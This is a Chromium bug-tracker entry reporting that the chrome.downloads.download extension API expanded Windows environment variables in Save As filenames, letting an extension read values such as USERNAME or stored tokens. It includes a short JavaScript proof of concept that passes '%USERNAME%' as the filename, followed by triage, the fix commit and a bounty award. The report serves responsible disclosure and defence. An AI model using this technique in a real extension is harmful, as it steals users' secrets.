# Security: chrome.downloads.download could be abused to steal user's environment variables like secrets, tokens or keys on windows.

| Field | Value |
|-------|-------|
| **Issue ID** | [40059207](https://issues.chromium.org/issues/40059207) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Platform>Extensions>API |
| **Platforms** | Windows |
| **Reporter** | zh...@gmail.com |
| **Assignee** | qi...@chromium.org |
| **Created** | 2022-03-26 |
| **Bounty** | $7,000.00 |

## Description

**VULNERABILITY DETAILS**

After digging into the issue: <https://bugs.chromium.org/p/chromium/issues/detail?id=1247389>, about window.showSaveFilePicker, I found that chrome extension api: chrome.downloads.download has the same problem.

Quote from the api doc:

<https://developer.chrome.com/docs/extensions/reference/downloads/#method-download>

If both `filename` and `saveAs` are specified, then the Save As dialog will be displayed, pre-populated with the specified `filename`

Code POC in the background DevTools console. Note: the extension need "permissions": ["downloads"], and user confirm is needed.

```
chrome.downloads.onChanged.addListener(  
  function(item) {  
    if (!item.filename) {  
      return;  
    }  
  
    console.log(item.filename)  
  }  
)  
  
chrome.downloads.download({url: 'https://dl.google.com/chrome/mac/universal/stable/CHFA/googlechrome.dmg', saveAs: true, filename: '%USERNAME%'})  

```

**VERSION**  

Chrome Version: 99.0.4844.84 stable  

Operating System: Windows 10 (Build 10240.16384)

**REPRODUCTION CASE**  

The code POC above steal USERNAME env. I also create a simple demo for easy reproducing the problem.

Preconditions: GITHUB\_TOKEN is set in the system env, and then restart the system.  

See the attached files: manifest.json, bg.js, icon\_128.png

Video POC, please see attached file: chrome.downlaods.download.mp4

**CREDIT INFORMATION**  

**Externally reported security bugs may appear in Chrome release notes. If**  

**this bug is included, how would you like to be credited?**  

Reporter credit: ChaobinZhang([zhchbin@gmail.com](mailto:zhchbin@gmail.com))

## Attachments

- [bg.js](attachments/bg.js) (text/plain, 540 B)
- [icon_128.png](attachments/icon_128.png) (image/png, 3.5 KB)
- [manifest.json](attachments/manifest.json) (text/plain, 319 B)
- [chrome.downloads.download.mp4](attachments/chrome.downloads.download.mp4) (video/mp4, 6.7 MB)

## Timeline

### [Deleted User] (2022-03-26)

[Empty comment from Monorail migration]

### an...@chromium.org (2022-03-26)

Thanks for the report. This issue is also similar to https://crbug.com/1308199 (applies to deprecated chrome.fileSystem API). 
Requires user to install malicious extension. Setting Severity as Low. 

[Monorail components: Platform>Extensions>API]

### [Deleted User] (2022-03-26)

[Empty comment from Monorail migration]

### [Deleted User] (2022-03-27)

Setting Pri-2 to match security severity Low. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### qi...@chromium.org (2022-03-28)

[Empty comment from Monorail migration]

### zh...@gmail.com (2022-03-28)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2022-03-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/8fe4d09509323628750d91ac5b112ec25b95e101

commit 8fe4d09509323628750d91ac5b112ec25b95e101
Author: Min Qin <qinmin@chromium.org>
Date: Mon Mar 28 21:45:24 2022

Replace % characters used in filename in Downloads API

BUG=1310461

Change-Id: I7031396497c6be14e761a22a932220ff0d6483bb
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3550829
Reviewed-by: Xing Liu <xingliu@chromium.org>
Commit-Queue: Min Qin <qinmin@chromium.org>
Reviewed-by: Shakti Sahu <shaktisahu@chromium.org>
Cr-Commit-Position: refs/heads/main@{#986161}

[modify] https://crrev.com/8fe4d09509323628750d91ac5b112ec25b95e101/chrome/browser/extensions/api/downloads/downloads_api.cc
[modify] https://crrev.com/8fe4d09509323628750d91ac5b112ec25b95e101/chrome/browser/extensions/api/downloads/downloads_api_browsertest.cc


### qi...@chromium.org (2022-03-29)

[Empty comment from Monorail migration]

### [Deleted User] (2022-03-29)

[Empty comment from Monorail migration]

### [Deleted User] (2022-03-29)

[Empty comment from Monorail migration]

### zh...@gmail.com (2022-04-12)

[Comment Deleted]

### am...@google.com (2022-04-28)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-04-28)

Congratulations, ChaobinZhang! The VRP Panel has decided to award you $7,000 for this report. A member of our finance team will be in touch with you soon to arrange payment. Thank you for your efforts and reporting this issue to us! 

### zh...@gmail.com (2022-04-28)

[Comment Deleted]

### zh...@gmail.com (2022-04-28)

Thank you very much! 

### am...@google.com (2022-05-07)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-05-24)

[Empty comment from Monorail migration]

### am...@google.com (2022-05-24)

[Empty comment from Monorail migration]

### [Deleted User] (2022-07-05)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@chromium.org (2022-07-21)

[Empty comment from Monorail migration]

### xi...@chromium.org (2022-07-21)

[Empty comment from Monorail migration]

### am...@google.com (2022-07-27)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-07-29)

[Empty comment from Monorail migration]

### is...@google.com (2022-07-29)

This issue was migrated from crbug.com/chromium/1310461?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40059207)*
